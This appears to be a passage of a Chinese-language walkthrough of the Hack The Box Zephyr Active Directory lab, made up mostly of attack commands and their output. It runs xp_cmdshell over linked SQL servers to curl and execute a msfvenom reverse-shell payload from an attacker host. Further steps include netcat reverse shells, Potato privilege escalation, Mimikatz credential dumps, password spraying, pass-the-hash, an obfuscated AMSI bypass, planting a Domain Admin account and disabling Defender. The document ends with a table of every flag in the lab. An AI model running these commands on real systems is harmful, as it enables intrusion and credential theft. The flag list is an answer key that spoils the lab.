```latex
EXECUTE('sp_configure "Show Advanced Options",1;') AT [ZSM-SVRCSQL02]
EXECUTE('RECONFIGURE;') AT [ZSM-SVRCSQL02]
EXECUTE('sp_configure "xp_cmdshell",1;') AT [ZSM-SVRCSQL02]
EXECUTE('RECONFIGURE;') AT [ZSM-SVRCSQL02]
```

确认 SQL02 IP：

```latex
EXECUTE('xp_cmdshell "ipconfig"') AT [ZSM-SVRCSQL02]
```

```latex
IPv4 Address : 192.168.210.19
```

同样下载 payload 并提权：

```latex
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.8 LPORT=80 -f exe > zephyr80.exe
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
```

```latex
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.16.8
LHOST => 10.10.16.8
msf exploit(multi/handler) > set LPORT 80
LPORT => 80
```

```latex
EXECUTE('xp_cmdshell "curl 10.10.16.8/zephyr80.exe -o c:\users\public\zephyr80.exe"') AT [ZSM-SVRCSQL02]
EXECUTE('xp_cmdshell "cmd /c c:\users\public\zephyr80.exe"') AT [ZSM-SVRCSQL02]
EXECUTE('xp_cmdshell "curl 10.10.16.8/SharpEfsPotato.exe -o c:\users\public\SharpEfsPotato.exe"') AT [ZSM-SVRCSQL02]
EXECUTE('xp_cmdshell "curl 10.10.16.8/nc.exe -o c:\users\public\nc.exe"') AT [ZSM-SVRCSQL02]
```

## 土豆提权
```latex
SharpEfsPotato.exe -p C:\users\public\nc.exe -a "10.10.17.173  53 -e cmd.exe"
```

## Getflag
SQL02 对应 flag：

```latex
ZEPHYR{G0tt4_l1nk_Up_4m_1_r1gh7?}
```

## 从 SQL02 提取 mssql_svc
Mimikatz 得到：

```latex
Username : mssql_svc
Domain   : INTERNAL.ZSM.LOCAL
Password : ToughPasswordToCrack123!
NTLM     : 8cb21ab7f3ee6d782c724216bd88d1d1
```

```plain
Username : mssql_svc
Domain   : INTERNAL.ZSM.LOCAL
Password : ToughPasswordToCrack123!
NTLM     : 8cb21ab7f3ee6d782c724216bd88d1d1
```

# PNT-SVRPSB-192.168.110.54
## evil-winrm登录
```plain
proxychains -q evil-winrm -i 192.168.110.54 -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53
```

## Getflag
```plain
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
ZEPHYR{7h3_Tru57_h45_B3eN_Br0k3n}
```

# ZPH-SVRCA01-192.168.210.12
## smbclient
```plain
proxychains -q impacket-smbclient -no-pass -hashes :84210eddc5724a7801fe78289ee94d44 zsm.local/administrator@192.168.210.12
```

```plain
# use C$
# get \users\public\desktop\flag.txt
```

## Getflag
```plain
ZEPHYR{C0n57r4in3d_d3l3g4710n_1s_d4ng3r0us}
```

# ZPH-SVRCHR-192.168.210.17
## 密码凭据
我们在**ZPH-SVRSQL02-192.168.210.19当中拿到了凭据**

```plain
Username : mssql_svc
Domain   : INTERNAL.ZSM.LOCAL
Password : ToughPasswordToCrack123!
NTLM     : 8cb21ab7f3ee6d782c724216bd88d1d1
```

## bloodhound
![](/image/hackthebox-prolabs/Zephyr-23.png)

![](/image/hackthebox-prolabs/Zephyr-24.png)

## 密码喷洒
提取所有域用户名称进行密码喷洒

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q netexec winrm 192.168.210.17 -u users -p 'ToughPasswordToCrack123!'
```

```plain
WINRM       192.168.210.17  5985   ZPH-SVRCHR       [+] internal.zsm.local\aron:ToughPasswordToCrack123! (Pwn3d!)
```

## evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q evil-winrm -i 192.168.210.17 -u aron -p ToughPasswordToCrack123!        
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Aron\Documents> 
```

## whoami
```plain
*Evil-WinRM* PS C:\Users\Aron\Documents> whoami /all

USER INFORMATION
----------------

User Name     SID
============= =============================================
internal\aron S-1-5-21-3056178012-3972705859-491075245-6608


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                           Attributes
====================================== ================ ============================================= ==================================================
Everyone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
internal\Service Management            Group            S-1-5-21-3056178012-3972705859-491075245-6613 Mandatory group, Enabled by default, Enabled group
internal\HR                            Group            S-1-5-21-3056178012-3972705859-491075245-6611 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

```

## **绕过 AMSI**
[Red-Team-Playbooks/5-Installation/5-Installation.md at master · 0xsyr0/Red-Team-Playbooks](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md#amsi-bypass)

[AMSI.fail](https://amsi.fail/)

```plain
$SSeqG7="`$lwbzamO_8sf=[APPdoMAIn]::cUrrenTDomAiN.getAsSeMBLIEs()|whErE-oBjEct{`$_.LOcAtion -AnD `$_.LoCAtion.enDSwith('System.Management.Automation.dll')};[vOid](Get-vARiAble -nAME 'jiA4jYM' -ErrOrActIon SILENTlycONTInue);`$Uuje=[SySTEM.ReFLECtion.BiNDiNGFlagS]'NonPublic,Static';`$yvd4=`$LWbzaMO_8sf.gEtTyPes()|wHEre-objeCt{`$_.NAME -EQ `$(('{0}{1}' -f 'Am','siUtils'))};`$FMdmCCbDCK='XtX7Rxa1qnDisr0';`$b862=`$yvD4.geTfiELD(`$(([SYSTEm.teXt.EnCODing]::asCiI.geTStriNg([bytE[]]((69+28),(0x69f7 -bXoR 0x699A),(82+33),(105+3-3),(67*19/19),((111)),(46+64),(10+106),(60+41),(0X4A5b -bXor 0x4A23),(116*55/55))))),`$uuJE).geTVaLuE(`$nulL);[sYSTeM.tHReAdInG.tHReAd]::Sleep(56);`$PPyLPILr0W=[SySTem.BItCoNVErter]::GEtbYTEs([sYsTem.inT32]::maXVAlue);[void](GeT-VARiABLE -Name 'VsHrX2h' -ERRoraCtiOn siLENTLyCOnTiNUe);[sysTeM.RUNtIme.INtEROpSErvICES.MArsHAL]::COPy(`$PPylPilR0W,0,`$B862,4)";inVoKe-ExprEssiON $SSeqG7
```

## powerup
### 本地上传
```plain
C:\Users\Aron> upload /home/kali/Desktop/tools/PowerSploit/PowerUp.ps1
. .\PowerUp.ps1
```

### 内存加载
```plain
iex(iwr http://10.10.16.8/PowerUp.psl -UseBasicParsing)
```

###  Invoke-AllChecks
> 我们需要使用RunAsCs.exe与nc64.exe来突破限制
>

```plain
*Evil-WinRM* PS C:\Users\Aron> Invoke-AllChecks
 
[*] Running Invoke-AllChecks

[*] Checking if user is in a local group with administrative privileges...

[*] Checking for unquoted service paths...
Access denied 
At C:\Users\Aron\PowerUp.ps1:457 char:21
+     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

[*] Checking service executable and argument permissions...
Access denied 
At C:\Users\Aron\PowerUp.ps1:488 char:5
+     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

[*] Checking service permissions...
Access denied 
At C:\Users\Aron\PowerUp.ps1:534 char:17
+     $Services = Get-WmiObject -Class win32_service | Where-Object {$_ ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

[*] Checking %PATH% for potentially hijackable .dll locations...

HijackablePath : C:\Users\Aron\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\Aron\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' -Command '...'

[*] Checking for AlwaysInstallElevated registry key...

[*] Checking for Autologon credentials in registry...

[*] Checking for vulnerable registry autoruns and configs...

[*] Checking for vulnerable schtask files/configs...

[*] Checking for unattended install files...

[*] Checking for encrypted web.config strings...

[*] Checking for encrypted application pool and virtual directory passwords...
```

## RunAsCs(失败)
### 上传runascs
```plain
upload /home/kali/Desktop/tools/RunasCs/old/RunasCs.exe 
```

### 上传nc
```plain
upload /home/kali/Desktop/tools/netcat/nc64.exe
```

### 反弹shell
> 失败了，被杀软封掉了
>
> 如果我们可以通过runascs反弹shell，那么我们就有权限查看滥用的服务，由此会发现wuauserv服务
>
> sc.exe stop wuauserv
>
> sc.exe config wuauserv binPath= "net localgroup Administrators aron /add"
>
> sc.exe start wuauserv
>
> 因此我们就能拿到administrator权限
>

```plain
*Evil-WinRM* PS C:\Users\Aron> & .\RunasCs.exe -l 3 aron ToughPasswordToCrack123! -d internal.zsm.local 'C:\Users\Aron\nc64.exe 10.10.16.8 80 -e cmd.exe'
The term '.\RunasCs.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:3
+ & .\RunasCs.exe -l 3 aron ToughPasswordToCrack123! -d internal.zsm.lo ...
+   ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (.\RunasCs.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

## internal-域控添权
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q smbexec.py Administrator@192.168.210.16 -hashes :543beb20a2a579c7714ced68a1760d5e
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>net user heathcliff Pass@123! /add /domain
The command completed successfully.

C:\Windows\system32>net group "Domain Admins" heathcliff /add /domain
The command completed successfully.
```

## internal-evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q evil-winrm -i 192.168.210.17 -u heathcliff -p Pass@123!
                                        
Evil-WinRM shell v3.9
                                       
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\heathcliff\Documents>
```

## Getflag
```plain
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
ZEPHYR{S3rv1c3_M4n4g3m3nt_f41L5}
```

## 关闭防护
```plain
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
powershell -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\Users\Public'"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

# ZPH-SVRCSUP-192.168.210.18
## bloodshound
BloodHound显示Melissa对ZPH-SVRCSUP有 CanPSRemote 权限（被加入了 Remote Management Use组）

![](/image/hackthebox-prolabs/Zephyr-25.png)

## Credential
> 在[ZPH-SVRCHR-192.168.210.17](#QtR2R)的shell中执行
>
> 条件：
>
> 知道账号密码： 用于重新向 KDC 认证获取票据
>
> 目标机器允许该用户 PSRemote：用户必须在目标机器的 Remote Management Users 组，或是本地管理员
>

```plain
$user = 'internal\melissa'
$passwd = 'WinterIsHere2022!'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user, $secpass
```

> 当然，如果bloodhound没有加载melissa具有adminto靶机的情况下，我们直接使用heathcliff凭据即可
>

```plain
$user = 'internal\heathcliff'
$passwd = 'Pass@123!'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user, $secpass
```

## Getflag
```plain
Invoke-Command -ComputerName ZPH-SVRCSUP -Credential $cred -ScriptBlock {type C:\users\administrator\desktop\flag.txt}
ZEPHYR{D0n7_f0rg3t_Imp0rt4nt_Inf0rm4710n}
```

# Flag **Overview**
| 名称 | Flag | 获取位置 |
| --- | --- | --- |
| The Premonition | `ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}` | `Bad-Pdf` 获取 `riley` 后的早期阶段，原始 `flag.md` 保留 |
| Back Tracking | `ZEPHYR{L34v3_N0_St0n3_Un7urN3d}` | Mail root |
| Recycled | `ZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}` | `192.168.110.56` |
| Disclosure | `ZEPHYR{S3rV1c3_AcC0Un7_5PN_Tr0uBl35}` | `PNT-SVRSVC` |
| Persistence | `ZEPHYR{P3r5isT4nc3_1s_k3Y_4_M0v3men7}` | `PNT-SVRBPA` |
| Heartbreak | `ZEPHYR{7h3_Tru57_h45_B3eN_Br0k3n}` | `PNT-SVRPSB` |
| Domination | `ZEPHYR{P41n73r_D0m41n_D0m1n4nc3}` | `painters.htb` 域控 |
| Monitored | `ZEPHYR{Abu51ng_d3f4ul7_Func710n4li7y_ftw}` | Zabbix root |
| The Forgotten | `ZEPHYR{C4n7_F0rg3t_ab0u7_7h1s_0n3}` | `ZPH-SVRADFS1` |
| Movement | `ZEPHYR{C0n57r4in3d_d3l3g4710n_1s_d4ng3r0us}` | `ZPH-SVRCA01` |
| Diverted | `ZEPHYR{K3y_Cr3d3n714l_l1nk_d4ng3r}` | `ZPH-SVRMGMT1` |
| The Statement | `ZEPHYR{SQLi_2_Imp3rs0n4710n_fun}` | `ZPH-SVRSQL01` |
| The Missing Link | `ZEPHYR{G0tt4_l1nk_Up_4m_1_r1gh7?}` | `ZSM-SVRCSQL02` |
| Tweaked | `ZEPHYR{S3rv1c3_M4n4g3m3nt_f41L5}` | `ZPH-SVRCHR` |
| Retrace | `ZEPHYR{D0n7_f0rg3t_Imp0rt4nt_Inf0rm4710n}` | `ZPH-SVRCSUP` |
| The Fall | `ZEPHYR{In73rn4l_D0m41n_D0m1n473d}` | `internal.zsm.local` 域控 |
| Compromised | `ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}` | SIDHistory / 跨域 Golden Ticket |




